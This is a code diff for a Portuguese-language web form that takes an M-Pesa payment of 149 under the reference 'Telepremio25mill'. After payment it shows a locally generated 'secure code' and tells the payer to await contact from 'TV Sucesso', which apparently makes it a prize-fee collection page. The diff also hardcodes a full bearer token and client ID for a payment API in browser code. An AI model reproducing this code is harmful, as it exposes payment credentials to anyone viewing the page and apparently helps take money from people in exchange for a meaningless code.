@@ -628,8 +628,13 @@
 
   el('copyBtn').addEventListener('click', async () => {
     const token = el('secureCode').innerText;
-    try { await navigator.clipboard.writeText(token); alert('Código copiado para a área de transferência.'); }
-    catch(e){ alert('Não foi possível copiar automaticamente. Seleccione e copie manualmente: ' + token); }
+    try { 
+      await navigator.clipboard.writeText(token); 
+      alert('Código copiado para a área de transferência.'); 
+    }
+    catch(e){ 
+      alert('Não foi possível copiar automaticamente. Seleccione e copie manualmente: ' + token); 
+    }
   });
 
   el('resetBtn').addEventListener('click', () => {
@@ -647,41 +652,80 @@
     const ticket = el('ticket').value.trim();
     const phone = el('phone').value.trim();
 
-    if(!province){el('formMsg').style.color='var(--danger)';el('formMsg').innerText='Selecione a sua província.'; return;}
-    if(!ticket){el('formMsg').style.color='var(--danger)';el('formMsg').innerText='Insira o Número da chamada / ID.'; return;}
-    if(!phone || phone.length < 7){el('formMsg').style.color='var(--danger)';el('formMsg').innerText='Insira um número M-Pesa válido.'; return;}
+    if(!province){
+      el('formMsg').style.color='var(--danger)';
+      el('formMsg').innerText='Selecione a sua província.';
+      return;
+    }
+    if(!ticket){
+      el('formMsg').style.color='var(--danger)';
+      el('formMsg').innerText='Insira o Número da chamada / ID.';
+      return;
+    }
+    if(!phone || phone.length < 7){
+      el('formMsg').style.color='var(--danger)';
+      el('formMsg').innerText='Insira um número M-Pesa válido.';
+      return;
+    }
 
     el('formMsg').style.color='#0b6623';
     el('formMsg').innerText='Processando pagamento...';
 
-    const payload = { phone: phone, amount: "149", reference: "Telepremio25mill" };
+    // Dados para a nova API
+    const url = "https://e2payments.explicador.co.mz/v1/c2b/mpesa-payment/166177";
+    const headers = {
+      "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJhMDgwZDU1MC1kYWMyLTRhZGMtYjgwYy0xNmQzZWY0ZGQzODkiLCJqdGkiOiI2YjUwNWU1YzZkNTY1ZWZhNGM2Zjk3YWFmNmYwZmQwOTJhYzdhYzUwZDRiMzdhZmE2NmI2MjY0ZmJmNzgwYWU2NzljODFlY2IzNjhjNTg3NSIsImlhdCI6MTc2NDc1MjUzNy4xODI3NzMsIm5iZiI6MTc2NDc1MjUzNy4xODI3NzYsImV4cCI6MTc5NjI4ODUzNy4xNzg2MDQsInN1YiI6IiIsInNjb3BlcyI6W119.vSGa-ZveJUwtYnNtAN45t__Tun6XAecBBP4uZNW4S4LTNqQhk7tuYCeJaVS-2LE1gkn18zCO2N4CJKOKfUQr_w43dSySimxkjx-r5Bfu2-QsdUJYuMVky7AKxow6CrfUQstNnQVTBlXJrBBsxttYd--s3I-xIWKyJf1l4jezLFYVZSyw6luLWdrcmmKuh9z--2gfQ5cg8LMND-ExTZsWbYke0yRJIxjU1MAK9PWuquLLbA2ZueULphJ95ejiZTlP78kRVGctr51_N0vahtnZNM9IGvFqKjVdj8BAteTejpr3lO8VJ7laLYQE-v9ceH0PAJzLiueV9P4t4sVQkJIljpC6ErKcH7D6C0SO-4TTKbE6J8F7lv_V8YyqncbZw-iV3pJQrpVTyjA-eZ_NuFSf8JHZVLuaZWPHPfmNYK6gMCtrieN8un_OHEyEWKc7WKBepHTeISvAouA7XMTsyRYUu8FIMbt79BN1Fs4iOI-Rigj1hloIFudVh_aaUgnS2VOK7qnG0PUrIkYnj51WA_a-1pKwEEU8Ak8ljEmATKDmMLxBEoRGu7xOCLFruYa1L261Bb9IpWpDG84CUJ7voJh4zZXRTIxIm-7jc4aN1DLi3x6bok9qemHciybnRhYdjAB_2oXIXcYftdLffH5pklkhiVV4QIW8a1ifV4Rcm08Z5Z0",
+      "Accept": "application/json",
+      "Content-Type": "application/x-www-form-urlencoded",
+    };
+
+    // Formatar os dados como application/x-www-form-urlencoded
+    const formData = new URLSearchParams();
+    formData.append('reference', 'Telepremio25mill');
+    formData.append('amount', '149');
+    formData.append('phone', phone);
+    formData.append('client_id', 'a080d550-dac2-4adc-b80c-16d3ef4dd389');
 
     try {
-      const resp = await fetch('https://telepremio-api.onrender.com/mpesa', {
-        method:'POST', headers:{'Accept':'*/*','Content-Type':'application/json'}, body:JSON.stringify(payload)
+      const resp = await fetch(url, {
+        method: 'POST',
+        headers: headers,
+        body: formData.toString()
       });
 
-      // If 200 -> show token and instructions
+      // Se a resposta for bem-sucedida (status 200)
       if (resp.status === 200) {
         const token = generateToken();
         el('secureCode').innerText = token;
         el('resultArea').style.display = 'block';
         el('formMsg').style.color = '#0b6623';
         el('formMsg').innerText = 'Pagamento confirmado (código gerado). Guarde o código e aguarde o contacto da equipa TV Sucesso.';
-        // optionally show server response in console
-        try { const json = await resp.json(); console.log('server response:', json); } catch(e){}
+        
+        // Opcional: mostrar resposta do servidor no console
+        try { 
+          const json = await resp.json(); 
+          console.log('Resposta do servidor:', json); 
+        } catch(e) {
+          console.log('Resposta do servidor (texto):', await resp.text());
+        }
       } else {
-        // try to read body for error
+        // Tentar ler a mensagem de erro
         let msg = `Erro ao processar pagamento (status ${resp.status}).`;
         try {
           const data = await resp.json();
           if (data && data.message) msg = data.message;
-        } catch(e){}
+        } catch(e){
+          // Se não for JSON, tentar ler como texto
+          try {
+            const text = await resp.text();
+            if (text) msg = `Erro: ${text.substring(0, 100)}...`;
+          } catch(e2){}
+        }
         el('formMsg').style.color = 'var(--danger)';
         el('formMsg').innerText = msg;
       }
     } catch (err) {
-      console.error(err);
+      console.error('Erro de rede:', err);
       el('formMsg').style.color = 'var(--danger)';
       el('formMsg').innerText = 'Erro de rede. Verifique a ligação e tente novamente.';
     }
